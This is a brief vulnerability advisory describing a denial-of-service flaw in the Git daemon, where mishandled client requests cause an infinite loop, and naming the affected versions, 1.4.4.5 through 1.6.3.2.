Git is prone to a denial-of-service vulnerability because it fails to properly handle some client requests.

Attackers can exploit this issue to cause a daemon process to enter an infinite loop. Repeated exploits may consume excessive system resources, resulting in a denial-of-service condition.

Git 1.4.4.5 through 1.6.3.2 are vulnerable; other versions may also be affected.
